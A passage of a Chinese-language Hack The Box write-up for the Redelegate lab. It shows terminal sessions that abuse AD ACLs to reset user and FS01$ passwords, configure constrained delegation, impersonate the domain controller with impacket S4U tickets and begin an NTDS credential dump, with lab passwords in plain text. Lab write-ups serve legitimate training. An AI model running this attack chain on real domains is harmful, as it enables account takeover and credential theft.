+</span></span><span style="display:flex;"><span>WINRM       10.129.234.50   <span style="color:#ae81ff">5985</span>   DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> redelegate.vl<span style="color:#ae81ff">\M</span>arie.Curie:Fall2024!
+</span></span></code></pre></div><p>猎犬能清晰的看到我们当前获得的用户允许修改6个用户的密码</p>
+<p><img src="/Redelegate/image.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>我一个一个顺着acl看下去发现只有HELEN.FROST是值得控制的</p>
+<p>它的组可以对fs0l有完全控制权</p>
+<p><img src="/Redelegate/image-1.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>并且这个用户同时存在在远程管理组当中，虽然给我们一台机器的完全掌控是什么意思我还不确定，我们先登陆再说</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Redelegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc smb $ip -u $user1 -p $pass1 -M change-password -o USER<span style="color:#f92672">=</span>HELEN.FROST NEWPASS<span style="color:#f92672">=</span>wackyMAKER1!
+</span></span><span style="display:flex;"><span>/home/wackymaker/.local/share/pipx/venvs/netexec/lib/python3.13/site-packages/masky/lib/smb.py:6: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated <span style="color:#66d9ef">for</span> removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.
+</span></span><span style="display:flex;"><span>  from pkg_resources import resource_filename
+</span></span><span style="display:flex;"><span>SMB         10.129.234.50   <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domin:redelegate.vl<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Null Auth:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.234.50   <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> redelegate.vl<span style="color:#ae81ff">\M</span>arie.Curie:Fall2024! 
+</span></span><span style="display:flex;"><span>CHANGE-P... 10.129.234.50   <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Successfully changed password <span style="color:#66d9ef">for</span> HELEN.FROST
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Redelegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc smb $ip -u $user1 -p $pass1 -M change-password -o USER<span style="color:#f92672">=</span>HELEN.FROST NEWPASS<span style="color:#f92672">=</span>wackyMAKER1^C
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Redelegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ echo user2<span style="color:#f92672">=</span>HELEN.FROST&gt;&gt;start.sh 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Redelegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ echo pass2<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;wackyMAKER1!&#39;</span>&gt;&gt;start.sh 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Redelegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ . start.sh 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Redelegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc winrm $ip -u $user2 -p $pass2
+</span></span><span style="display:flex;"><span>WINRM       10.129.234.50   <span style="color:#ae81ff">5985</span>   DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:redelegate.vl<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>WINRM       10.129.234.50   <span style="color:#ae81ff">5985</span>   DC               <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> redelegate.vl<span style="color:#ae81ff">\H</span>ELEN.FROST:wackyMAKER1! <span style="color:#f92672">(</span>Pwn3d!<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>登陆后获得user.txt</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Redelegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ evil-winrm-py -i $ip -u $user1 -p $pass2
+</span></span><span style="display:flex;"><span>          _ _            _                             
+</span></span><span style="display:flex;"><span>  _____ _<span style="color:#f92672">(</span>_| |_____ __ _<span style="color:#f92672">(</span>_<span style="color:#f92672">)</span>_ _  _ _ _ __ ___ _ __ _  _ 
+</span></span><span style="display:flex;"><span> / -_<span style="color:#ae81ff">\ </span>V | | |___<span style="color:#ae81ff">\ </span>V  V | | <span style="color:#e6db74">&#39; \| &#39;</span>_| <span style="color:#e6db74">&#39;  |___| &#39;</span>_ | <span style="color:#f92672">||</span> |
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">\_</span>__|<span style="color:#ae81ff">\_</span>/|_|_|    <span style="color:#ae81ff">\_</span>/<span style="color:#ae81ff">\_</span>/|_|_<span style="color:#f92672">||</span>_|_| |_|_|_|  | .__/<span style="color:#ae81ff">\_</span>, |
+</span></span><span style="display:flex;"><span>                                            |_|   |__/  v1.4.1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Connecting to <span style="color:#e6db74">&#39;10.129.234.50:5985&#39;</span> as <span style="color:#e6db74">&#39;Marie.Curie&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Failed to authenticate the user Marie.Curie with ntlm
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Redelegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ evil-winrm-py -i $ip -u $user2 -p $pass2
+</span></span><span style="display:flex;"><span>          _ _            _                             
+</span></span><span style="display:flex;"><span>  _____ _<span style="color:#f92672">(</span>_| |_____ __ _<span style="color:#f92672">(</span>_<span style="color:#f92672">)</span>_ _  _ _ _ __ ___ _ __ _  _ 
+</span></span><span style="display:flex;"><span> / -_<span style="color:#ae81ff">\ </span>V | | |___<span style="color:#ae81ff">\ </span>V  V | | <span style="color:#e6db74">&#39; \| &#39;</span>_| <span style="color:#e6db74">&#39;  |___| &#39;</span>_ | <span style="color:#f92672">||</span> |
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">\_</span>__|<span style="color:#ae81ff">\_</span>/|_|_|    <span style="color:#ae81ff">\_</span>/<span style="color:#ae81ff">\_</span>/|_|_<span style="color:#f92672">||</span>_|_| |_|_|_|  | .__/<span style="color:#ae81ff">\_</span>, |
+</span></span><span style="display:flex;"><span>                                            |_|   |__/  v1.4.1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Connecting to <span style="color:#e6db74">&#39;10.129.234.50:5985&#39;</span> as <span style="color:#e6db74">&#39;HELEN.FROST&#39;</span>
+</span></span><span style="display:flex;"><span>evil-winrm-py PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\H</span>elen.Frost<span style="color:#ae81ff">\D</span>ocuments&gt; cd ,,.
+</span></span><span style="display:flex;"><span>At line:1 char:4
+</span></span><span style="display:flex;"><span>+ cd ,,.
+</span></span><span style="display:flex;"><span>+    ~
+</span></span><span style="display:flex;"><span>Missing argument in parameter list.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>At line:1 char:5
+</span></span><span style="display:flex;"><span>+ cd ,,.
+</span></span><span style="display:flex;"><span>+     ~
+</span></span><span style="display:flex;"><span>Missing argument in parameter list.
+</span></span><span style="display:flex;"><span>evil-winrm-py PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\H</span>elen.Frost<span style="color:#ae81ff">\D</span>ocuments&gt; cd ../
+</span></span><span style="display:flex;"><span>evil-winrm-py PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\H</span>elen.Frost&gt; cd Desktop
+</span></span><span style="display:flex;"><span>evil-winrm-py PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\H</span>elen.Frost<span style="color:#ae81ff">\D</span>esktop&gt; dir
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directory: C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\H</span>elen.Frost<span style="color:#ae81ff">\D</span>esktop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                 LastWriteTime         Length Name                                                                  
+</span></span><span style="display:flex;"><span>----                 -------------         ------ ----                                                                  
+</span></span><span style="display:flex;"><span>-ar---         9/20/2025  10:06 PM             <span style="color:#ae81ff">34</span> user.txt                                                              
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>evil-winrm-py PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\H</span>elen.Frost<span style="color:#ae81ff">\D</span>esktop&gt; type user.txt
+</span></span><span style="display:flex;"><span>5db9ac9e78434e1c6bc501a39c0bb3c2
+</span></span></code></pre></div><h2 id="提权">提权
+</h2><p>查看特权</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>evil-winrm-py PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\H</span>elen.Frost<span style="color:#ae81ff">\D</span>esktop&gt; whoami /priv
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PRIVILEGES INFORMATION
+</span></span><span style="display:flex;"><span>----------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Privilege Name                Description                                                    State  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=============================</span> <span style="color:#f92672">==============================================================</span> <span style="color:#f92672">=======</span>
+</span></span><span style="display:flex;"><span>SeMachineAccountPrivilege     Add workstations to domain                                     Enabled
+</span></span><span style="display:flex;"><span>SeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled
+</span></span><span style="display:flex;"><span>SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted <span style="color:#66d9ef">for</span> delegation Enabled
+</span></span><span style="display:flex;"><span>SeIncreaseWorkingSetPrivilege Increase a process working set                                 Enabled
+</span></span><span style="display:flex;"><span>evil-winrm-py PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\H</span>elen.Frost<span style="color:#ae81ff">\D</span>esktop&gt;
+</span></span></code></pre></div><p>存在SeEnableDelegationPrivilege特权，允许设置委派</p>
+<p>但是当前用户创建机器权限是没有的</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Redelegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc ldap $ip -u $user1 -p $pass1 -M maq
+</span></span><span style="display:flex;"><span>/home/wackymaker/.local/share/pipx/venvs/netexec/lib/python3.13/site-packages/masky/lib/smb.py:6: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated <span style="color:#66d9ef">for</span> removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.
+</span></span><span style="display:flex;"><span>  from pkg_resources import resource_filename
+</span></span><span style="display:flex;"><span>LDAP        10.129.234.50   <span style="color:#ae81ff">389</span>    DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:redelegate.vl<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:None<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>channel binding:No TLS cert<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span>LDAP        10.129.234.50   <span style="color:#ae81ff">389</span>    DC               <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> redelegate.vl<span style="color:#ae81ff">\M</span>arie.Curie:Fall2024! 
+</span></span><span style="display:flex;"><span>MAQ         10.129.234.50   <span style="color:#ae81ff">389</span>    DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Getting the MachineAccountQuota
+</span></span><span style="display:flex;"><span>MAQ         10.129.234.50   <span style="color:#ae81ff">389</span>    DC               MachineAccountQuota: <span style="color:#ae81ff">0</span>
+</span></span></code></pre></div><p>没法创建机器用户和dns，放弃无约束委派，配置一个针对dc的约束委派</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>evil-winrm-py PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\H</span>elen.Frost<span style="color:#ae81ff">\D</span>esktop&gt; Set-ADAccountControl -Identity <span style="color:#e6db74">&#34;FS01</span>$<span style="color:#e6db74">&#34;</span> -TrustedToAuthForDelegation $
+</span></span><span style="display:flex;"><span>True
+</span></span><span style="display:flex;"><span>evil-winrm-py PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\H</span>elen.Frost<span style="color:#ae81ff">\D</span>esktop&gt; Set-ADObject -Identity <span style="color:#e6db74">&#34;CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL&#34;</span> -A
+</span></span><span style="display:flex;"><span>dd @<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;msDS-AllowedToDelegateTo&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ldap/dc.redelegate.vl&#34;</span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>直接打一个约束委派，先把fs01改密码</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Redelegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc smb $ip -u $user2 -p $pass2 -M change-password -o USER<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;FS01$&#39;</span> NEWPASS<span style="color:#f92672">=</span>wackyMAKER1!
+</span></span><span style="display:flex;"><span>/home/wackymaker/.local/share/pipx/venvs/netexec/lib/python3.13/site-packages/masky/lib/smb.py:6: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated <span style="color:#66d9ef">for</span> removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.
+</span></span><span style="display:flex;"><span>  from pkg_resources import resource_filename
+</span></span><span style="display:flex;"><span>SMB         10.129.234.50   <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domin:redelegate.vl<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Null Auth:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.234.50   <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> redelegate.vl<span style="color:#ae81ff">\H</span>ELEN.FROST:wackyMAKER1! 
+</span></span><span style="display:flex;"><span>CHANGE-P... 10.129.234.50   <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Successfully changed password <span style="color:#66d9ef">for</span> FS01$
+</span></span></code></pre></div><p>之后直接委派，委派dc</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Redelegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc smb $ip -u $user2 -p $pass2 -M change-password -o USER<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;FS01$&#39;</span> NEWPASS<span style="color:#f92672">=</span>wackyMAKER1!
+</span></span><span style="display:flex;"><span>/home/wackymaker/.local/share/pipx/venvs/netexec/lib/python3.13/site-packages/masky/lib/smb.py:6: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated <span style="color:#66d9ef">for</span> removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.
+</span></span><span style="display:flex;"><span>  from pkg_resources import resource_filename
+</span></span><span style="display:flex;"><span>SMB         10.129.234.50   <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domin:redelegate.vl<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Null Auth:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.234.50   <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> redelegate.vl<span style="color:#ae81ff">\H</span>ELEN.FROST:wackyMAKER1! 
+</span></span><span style="display:flex;"><span>CHANGE-P... 10.129.234.50   <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Successfully changed password <span style="color:#66d9ef">for</span> FS01$
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Redelegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ echo user3<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;FS01$&#39;</span>&gt;&gt;start.sh 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Redelegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ echo pass3<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;wackyMAKER1!&#39;</span>&gt;&gt;start.sh 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Redelegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ . start.sh 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Redelegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc smb $ip -u $user3 -p $pass3
+</span></span><span style="display:flex;"><span>SMB         10.129.234.50   <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domin:redelegate.vl<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Null Auth:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.234.50   <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> redelegate.vl<span style="color:#ae81ff">\F</span>S01$:wackyMAKER1! 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Redelegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo ntpdate $ip
+</span></span><span style="display:flex;"><span>2025-09-21 02:49:26.412852 <span style="color:#f92672">(</span>-0400<span style="color:#f92672">)</span> +0.124303 +/- 0.039395 10.129.234.50 s1 no-leap
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Redelegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ impacket-getTGT $domain/$user3:$pass3 -dc-ip $ip
+</span></span><span style="display:flex;"><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saving ticket in FS01$.ccache
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Redelegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ export KRB5CCNAME<span style="color:#f92672">=</span>FS01<span style="color:#ae81ff">\$</span>.ccache 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Redelegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ impacket-getST -spn ldap/dc.redelegate.vl -impersonate dc $domain/$user3 -k -no-pass -dc-ip $ip
+</span></span><span style="display:flex;"><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Impersonating dc
+</span></span><span style="display:flex;"><span>/usr/share/doc/python3-impacket/examples/getST.py:380: DeprecationWarning: datetime.datetime.utcnow<span style="color:#f92672">()</span> is deprecated and scheduled <span style="color:#66d9ef">for</span> removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now<span style="color:#f92672">(</span>datetime.UTC<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>  now <span style="color:#f92672">=</span> datetime.datetime.utcnow<span style="color:#f92672">()</span>
+</span></span><span style="display:flex;"><span>/usr/share/doc/python3-impacket/examples/getST.py:477: DeprecationWarning: datetime.datetime.utcnow<span style="color:#f92672">()</span> is deprecated and scheduled <span style="color:#66d9ef">for</span> removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now<span style="color:#f92672">(</span>datetime.UTC<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>  now <span style="color:#f92672">=</span> datetime.datetime.utcnow<span style="color:#f92672">()</span> + datetime.timedelta<span style="color:#f92672">(</span>days<span style="color:#f92672">=</span>1<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Requesting S4U2self
+</span></span><span style="display:flex;"><span>/usr/share/doc/python3-impacket/examples/getST.py:607: DeprecationWarning: datetime.datetime.utcnow<span style="color:#f92672">()</span> is deprecated and scheduled <span style="color:#66d9ef">for</span> removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now<span style="color:#f92672">(</span>datetime.UTC<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>  now <span style="color:#f92672">=</span> datetime.datetime.utcnow<span style="color:#f92672">()</span>
+</span></span><span style="display:flex;"><span>/usr/share/doc/python3-impacket/examples/getST.py:659: DeprecationWarning: datetime.datetime.utcnow<span style="color:#f92672">()</span> is deprecated and scheduled <span style="color:#66d9ef">for</span> removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now<span style="color:#f92672">(</span>datetime.UTC<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>  now <span style="color:#f92672">=</span> datetime.datetime.utcnow<span style="color:#f92672">()</span> + datetime.timedelta<span style="color:#f92672">(</span>days<span style="color:#f92672">=</span>1<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Requesting S4U2Proxy
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saving ticket in dc@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache
+</span></span></code></pre></div><p>直接dcsync</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Redelegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ KRB5CCNAME<span style="color:#f92672">=</span>dc@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache nxc smb $ip --use-kcache --ntds --user Administrator
+</span></span><span style="display:flex;"><span>SMB         10.129.234.50   <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domin:redelegate.vl<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Null Auth:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.234.50   <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> redelegate.vl<span style="color:#ae81ff">\d</span>c from ccache 
+</span></span><span style="display:flex;"><span>SMB         10.129.234.50   <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
+</span></span><span style="display:flex;"><span>SMB         10.129.234.50   <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Dumping the NTDS, this could take a <span style="color:#66d9ef">while</span> so go grab a redbull...
